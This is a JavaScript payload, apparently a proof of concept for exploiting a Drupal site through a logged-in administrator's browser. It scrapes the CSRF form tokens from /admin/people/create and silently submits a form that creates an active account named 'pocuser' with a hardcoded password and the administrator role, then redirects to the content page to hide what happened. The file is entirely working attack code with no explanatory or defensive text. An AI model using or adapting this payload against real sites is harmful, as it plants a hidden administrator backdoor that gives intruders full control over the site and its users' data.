const newAccUser = "pocuser";
const newAccPass = "M4oslW1mQlm9cLGXyVba";
const drupalRoot = "";
const newUserURL = drupalRoot + "/admin/people/create";
const dashboardURL = drupalRoot + "/admin/content";
const req = new XMLHttpRequest();
req.open("GET", newUserURL, false);
req.send(null);
const formToken = req.responseText.match(/form_token" value="([^"]*?)"/)[1];
const formBuildId = req.responseText.match(/form_build_id" value="([^"]*?)"/)[1];
const genRandHex = size => [...Array(size)].map(() => Math.floor(Math.random() * 16).toString(16)).join("");
const boundary = "-----------------------------" + genRandHex(28);
const newline = "\r\n";
const bodyData = boundary + newline +
  "Content-Disposition: form-data; name=\"mail\"" + newline +
  newline +
  newline +
  boundary + newline +
  "Content-Disposition: form-data; name=\"name\"" + newline +
  newline +
  newAccUser + newline +
  boundary + newline +
  "Content-Disposition: form-data; name=\"pass[pass1]\"" + newline +
  newline +
  newAccPass + newline +
  boundary + newline +
  "Content-Disposition: form-data; name=\"pass[pass2]\"" + newline +
  newline +
  newAccPass + newline +
  boundary + newline +
  "Content-Disposition: form-data; name=\"status\"" + newline +
  newline +
  "1" + newline +
  boundary + newline +
  "Content-Disposition: form-data; name=\"roles[administrator]\"" + newline +
  newline +
  "administrator" + newline +
  boundary + newline +
  "Content-Disposition: form-data; name=\"user_picture[0][fids]\"" + newline +
  newline +
  newline +
  boundary + newline +
  "Content-Disposition: form-data; name=\"form_build_id\"" + newline +
  newline +
  formBuildId + newline +
  boundary + newline +
  "Content-Disposition: form-data; name=\"form_token\"" + newline +
  newline +
  formToken + newline +
  boundary + newline +
  "Content-Disposition: form-data; name=\"form_id\"" + newline +
  newline +
  "user_register_form" + newline +
  boundary + newline +
  "Content-Disposition: form-data; name=\"timezone\"" + newline +
  newline +
  "Europe/Zagreb" + newline +
  boundary + newline +
  "Content-Disposition: form-data; name=\"op\"" + newline +
  newline +
  "Create new account" + newline +
  boundary + "--" + newline;
var bodyDataArray = new Uint8Array(bodyData.length);
for(var i = 0; i < bodyDataArray.length; i ++) { bodyDataArray[i] = bodyData.charCodeAt(i); };
req.open("POST", newUserURL, true);
req.setRequestHeader("Content-Type", "multipart\/form-data; boundary=" + boundary.slice(2));
req.withCredentials = true;
req.send(new Blob([bodyDataArray]));
req.onreadystatechange = function() {
  if (req.readyState == XMLHttpRequest.DONE) {
    window.location.replace(dashboardURL);
  }
}
